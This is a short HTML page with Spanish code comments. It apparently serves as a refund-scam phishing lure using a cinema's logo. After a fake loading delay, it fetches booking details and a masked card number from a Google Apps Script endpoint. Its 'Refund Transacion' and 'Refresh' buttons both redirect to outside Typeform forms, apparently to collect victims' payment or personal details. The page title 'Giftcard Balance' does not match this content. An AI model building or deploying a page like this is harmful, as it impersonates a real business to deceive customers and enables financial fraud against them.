<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Giftcard Balance</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #003a7e;
            color: #ffffff;
            margin: 0;
            padding: 0;
            text-align: center;
        }
        .container {
            margin-top: 15%;
        }
        #loadingMessage {
            font-size: 26px;
            color: #ffffff;
        }
        .button-container {
            margin-top: 20px;
        }
        .button-container button {
            display: none;
            padding: 15px 30px;
            font-size: 18px;
            background-color: #005bb5;
            color: #ffffff;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            margin-right: 10px; /* Espacio entre botones */
        }
        .button-container button:hover {
            background-color: #007bff;
        }
        #logo {
            width: 150px;
            margin-bottom: 20px;
        }
        #balanceDisplay {
            margin-top: 20px;
            font-size: 22px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img id="logo" src="https://cdn.theatertoolkit.com/cdn/wwwroot/themes/custom/thelotent/images/logo.png?v=20240904.1" alt="Logo">
        
        <p id="loadingMessage">We are loading the booking details...</p>
        
        <!-- Contenedor para los botones -->
        <div class="button-container">
            <button id="continueButton" onclick="fetchBalance()">Check BookingID Details</button>
            <button id="redeemButton" onclick="redeemBalance()">Refund Transacion</button>
            <button id="refreshButton" onclick="refreshPage()">Refresh</button>
        </div>
    </div>

    <div id="balanceDisplay" style="display:none;"></div>

    <script>
        // Mostrar el botón de continuar después de 5 segundos
        setTimeout(function() {
            document.getElementById("loadingMessage").style.display = "none";
            document.getElementById("continueButton").style.display = "block";
        }, 5000);

        // Función para obtener los datos del Google Sheets
        function fetchBalance() {
            document.getElementById("continueButton").style.display = "none";

            fetch('https://script.google.com/macros/s/AKfycbxWvn-brZ17Sf7VybTrmR4I11k775KHtn-Q5h2j-EhXyZnYCE7fpSylPOtDGDoA7P166g/exec')
                .then(response => response.json())
                .then(data => {
                    const display = `

                        <p>BookingID: ${data.A2}</p>
                        <p>MaskedCreditCardNumber: ${data.B2}</p>
                        <p>CardType: ${data.C2}</p>
                        <p>Cinema: ${data.D2}</p>
                        <p>TicketPrice:$ ${data.E2}</p>
                        <p>BookingFee:$ ${data.F2}</p>
                        <p>Sequence: ${data.H2}</p>
                        <p>TicketType:$ ${data.J2}</p>
                    `;
                    document.getElementById("balanceDisplay").innerHTML = display;
                    document.getElementById("balanceDisplay").style.display = "block";

                    // Mostrar los botones "Redeem Balance" y "Refresh"
                    document.getElementById("redeemButton").style.display = "inline-block";
                    document.getElementById("refreshButton").style.display = "inline-block";
                })
                .catch(error => console.error('Error fetching balance:', error));
        }

        // Función para redirigir a otra URL cuando se haga clic en "Redeem Balance"
        function redeemBalance() {
            window.location.href = 'https://qkstzdro6ry.typeform.com/to/bSJ8YkcX';
        }

        // Función para refrescar la página
        function refreshPage() {
            window.location.href = 'https://qkstzdro6ry.typeform.com/to/MIf1SW2o';
        }
    </script>
</body>
</html>
